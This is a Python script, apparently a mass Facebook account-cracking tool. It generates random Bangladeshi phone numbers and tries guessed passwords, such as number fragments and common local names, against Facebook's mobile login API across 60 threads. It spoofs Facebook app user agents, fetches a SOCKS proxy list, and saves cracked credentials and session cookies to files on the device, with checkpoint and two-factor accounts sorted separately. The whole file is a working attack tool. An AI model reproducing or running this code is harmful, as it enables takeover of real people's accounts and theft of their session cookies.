import os,time,random,string,re,sys,requests,json,uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
gtxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
gt=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
try:os.system("")
except:pass
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime 
from string import *
dateti=str(datetime.now()).split(" ")[0]
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:pass
proxsi=open('socksku.txt','r').read().splitlines()



def ___fuck___():
	mix_model = requests.get('https://gist.githubusercontent.com/Nox-Naved/f0fe39c5e9ff2b70bcb39e48a3e77301/raw/413a4f26f81da4f40d51349a87facc2894bc0531/600+').text.splitlines()
	fb_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_vercode = str(random.randint(10000000, 66666666))
	ua1 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	ua2 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=2.0,width=720,height=1184};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X008D;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	ua3 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=1.5,width=480,height=854};FBLC/pt_PT;FBRV/82651122;FBCR/altice MEO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00BD;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	ua4 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=2.0,width=720,height=1352};FBLC/it_IT;FBRV/203912779;FBCR/ho.;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00RD;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	ua5= f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(fb_version)+';FBBV/'+str(fb_vercode)+';FBDM/{density=2.778567894596777,width=1136,height=1485};FBLC/en_US;FBRV/0;FBCR/Comium;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/A21;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
	sex = random.choice([ua1,ua2,ua3,ua4,ua5])
	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {random.choice(mix_model)} Build/TP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ' + sex
	return ua


ugen=[]
ugtn=[]
ugxn=[] 
xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')


dt="•"
id
ok=[]
cp=[]
twf=[]
lop=0
xode=[]
plist=[]
cpx=[]
cokix=[]
apkx=[]
paswtrh = []
rcd=[]
rcdx=[]
version="1.07"
class t:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.050)
            
            
def line():
	print(47*"━")



def logo():
	os.system('clear')
	line()
	
def Main():
	logo()
	print(f'[1] RANDOM')
	print(f'[0] EXIT')
	line()
	ghx=input(f'CHOOSE : ')
	if ghx in ["1"]:rcd.append(f'1');rmenu1()
	elif ghx in ["0"]:rcd.append(f'0');rmenu1()
	else:line();print(f'\n \tCHOOSE VALID OPTION');time.sleep(1);Main()
def rmenu1():
	logo()
	if "1" in rcd:print(f"BD SIM CODE : 013 014 015 016 017 018 019");line()
	if "0" in rcd:exit()
	code=input(f'CHOOSE : ')
	print(f"EXAMPLE : 1000 5000 10000 15000 20000");line()
	limit=int(input(f'LIMIT : '))
	print(f"DO YOU WENT SHOW CP ACCOUNT (y/n)");line()
	cx=input(f'CHOOSE : ')
	if cx in ['n','N','no','NO','2']:cpx.append(f'n')
	else:cpx.append(f'y')
	print(f"DO YOU WENT SHOW COOKIE (y/n)");line()
	ckiv=input(f'CHOOSE : ')
	if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
	else:cokix.append(f'y')
	for number in range(limit):
		if "1" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
		if "2" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
		if "3" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(6));xode.append(numberx)
	with ThreadPool(max_workers=60) as tonxoys:
		tid= str(len(xode))
		logo()
		
		print(f'YOUR TOTAL ID : '+tid)
		print(f'YOUR SIM CODE : '+code)
		line()
		for rngx in xode:
			id=code+rngx
			if "1" in rcd:psd=[id,rngx,id[:6],id[:7],id[:8],id[5:]]
			if "2" in rcd:psd=[id,rngx,id[:6],id[:7],id[:8],id[:9],"Bangladesh","@1234@","@12345@","@#@#@#","@#123456@#","@@@###","aabbcc","aaabbb","১২৩৪৫৬","১২৩৪৫৬৭৮","123456","1234567","708090","mehedi","mababa","sadiya","jannat12","sabbir123","@123456@","&&&&&&","112233","444777","sadiya@12","sagor12","sakib12","sakib@12","sakib1","sakib@#","sakib123","sakib21","sabbir12","sabbir@#","sabbir1","sabbir123","sabbir#","sabbir1234","mamun12","siam123","sadik123","evan12","evan123","siddik","siddik123","masum12","masum123","masum1122","masud12","masud1","masud123","sojib12","sojib123","sojib11","pranto12","pranto123","pranto1122","antor@@##","antorkhan","antor123","Bangla","bangla","I LOVE YOU","i love you","@@@###","@#@#@#","###@@@","১২৩৪৫৬৭৮","sadiya","sumaiya","jannatul","00998877","113355","mababa","১২৩৪৫৬৭","sabbir","aabbcc","abbuammu","sumiya","১২৩৪৫৬৭৮৯"]
			if "3" in rcd:psd=[id,rngx,id[:6],"bangladesh"]
			tonxoys.submit(graphrm,id,psd,tid)
			#Bangladesh','bangladesh','Bangla','bangla','I LOVE YOU','i love you','@@@###','@#@#@#','###@@@','১২৩৪৫৬৭৮','sadiya','sumaiya','jannatul','00998877','113355','mababa','১২৩৪৫৬৭','sabbir','aabbcc','abbuammu','sumiya','১২৩৪৫৬৭৮৯']
lk=[]
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r[{lop}] [{tid}]');sys.stdout.flush()
	for psw in psd:
		vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150));VAPP = random.randint(410000000,499999999);gtt=random.choice(xxxxx);gttt=random.choice(xxxxx)   

		ua = "[FBAN/FB4A;FBAV/"+str(random.randint(199,399))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(99,199))+";FBBV/"+str(random.randint(111111111,999999999))+";FBDM/{density="+str(random.randint(2,4))+"."+str(random.randint(2,5))+",width=1080,height="+str(random.randint(1400,1499))+"};FBLC/"+str(random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"]))+";FBRV/"+str(random.randint(111111111,999999999))+";FBCR/"+str(random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","Tele2 LT","Jio 4G","EE","Oi","MtelBG","AT&amp;amp-T","Ufone","Azercell"]))+";FBMF/Xiaomi;FBBD/"+str(random.choice(["xiaomi","Xiaomi","Redmi"]))+";FBPN/com.facebook.katana;FBDV/"+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+";FBSV/"+str(random.randint(9,14))+";FBOP/1;FBCA/arm64-v8a:;]"
		ua = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))+";FBBV/"+str(random.randint(1111111,7777777))+";Dalvik/2.1.0 (Linux; U; Android 10; Infinix X688B Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/288.0.0.5.115;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/346850586;FBCR/Grameenphone;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X688B;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1472};]"
		ua = "[FBAN/FB4A;FBAV/"+str(random.randint(111,777))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";Dalvik/2.1.0 (Linux; U; Android 11; moto g power (2021) Build/RZBS31.Q2-143-27-7) [FBAN/Orca-Android;FBAV/352.0.0.9.116;FBPN/com.facebook.orca;FBLC/en_US;FBBV/356687955;FBCR/cricket;FBMF/motorola;FBBD/motorola;FBDV/moto g power (2021);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1488};FB_FW/1;]"
		ua = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))+";FBBV/"+str(random.randint(1111111,7777777))+";Dalvik/2.1.0 (Linux; U; Android 10; Pixel 3 Build/QQ3A.200605.001) [FBAN/Orca-Android;FBAV/271.0.0.11.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/227270208;FBCR/Banglalink;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FB_FW/1;]"
		ua = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))+";FBBV/"+str(random.randint(1111111,7777777))+";Dalvik/2.1.0 (Linux; U; Android 14; Infinix X669 Build/UP1A.231005.007; wv) [FBAN/Orca-Android;FBAV/418.0.0.6.105;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/588686349;FBCR/Grameenphone;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/14;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2436};FB_FW/1;]"
		datax= {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': id,'password': psw,'generate_analytics_claims': '1', 'community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
		header={'User-Agent': ___fuck___(),'Accept-Encoding':  'gzip, deflate','Accept': '*/*', 'Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
		twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
		lo=requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=datax,headers=header,allow_redirects=False).json()
		if 'session_key' in lo:
			cki = lo["session_cookies"]
			ck={}
			for xk in cki:ck.update({xk["name"]:xk["value"]})
			coki = (";").join([ "%s=%s" % (key, value) for key, value in ck.items() ])
			iid= re.findall('c_user=(.*);xs', coki)[0]
			print(f'\r\r[OK] {iid} | {psw}');ok.append(id);open('/sdcard/OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			if 'y' in cokix:print(f'\r\r[COOKIES] {coki}');line()
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r[2F] {iid} | {psw}');line();open('/sdcard/2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
		elif 'www.facebook.com' in lo['error']['message']:
			try:
				iid = lo['error']['error_data']['uid']
			except:
				iid=id
			if iid in ok:pass
			else:
				if 'y' in cpx:
					print(f'\r\r[CP] {iid} | {psw}');line();cp.append(id);open('/sdcard/CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
#apvroval.check()